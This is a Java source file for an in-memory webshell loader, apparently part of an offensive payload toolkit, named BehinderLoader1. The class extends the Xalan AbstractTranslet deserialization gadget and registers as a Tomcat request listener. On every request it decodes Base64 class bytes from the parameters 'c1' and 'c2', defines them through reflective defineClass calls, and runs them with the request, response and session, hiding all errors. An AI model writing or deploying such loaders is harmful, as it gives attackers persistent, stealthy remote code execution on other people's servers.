package cn.safe6.payload.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import sun.misc.BASE64Decoder;

import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;


/**
 * 加载器也当成一个内存马注入
 */
public class BehinderLoader1 extends AbstractTranslet implements ServletRequestListener {

    public static Object getField(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 != null) {
            var2.setAccessible(true);
            return var2.get(var0);
        } else {
            throw new NoSuchFieldException(var1);
        }
    }

    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    public void requestInitialized(ServletRequestEvent sre) {


        try {
            RequestFacade requestfacade = (RequestFacade) sre.getServletRequest();
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestfacade);
            Response response = request.getResponse();
            HttpSession session = request.getSession();
            String var13 = request.getParameter("c1");
            byte[] var14 = (new BASE64Decoder()).decodeBuffer(var13);
            Method var15 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var15.setAccessible(true);

            Class var16 = (Class) var15.invoke(BehinderLoader1.class.getClassLoader(), var14, new Integer(0), new Integer(var14.length));
            String var17 = request.getParameter("c2");
            byte[] var18 = (new BASE64Decoder()).decodeBuffer(var17);
            Method var19 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var19.setAccessible(true);
            Class var20 = (Class) var19.invoke(BehinderLoader1.class.getClassLoader(), var18, new Integer(0), new Integer(var18.length));
            var20.getConstructor(var16).newInstance(var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(request, response)).equals(new Object[]{request, response, session, var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(request, response)});

        } catch (Exception ignored) {
        }

    }

}
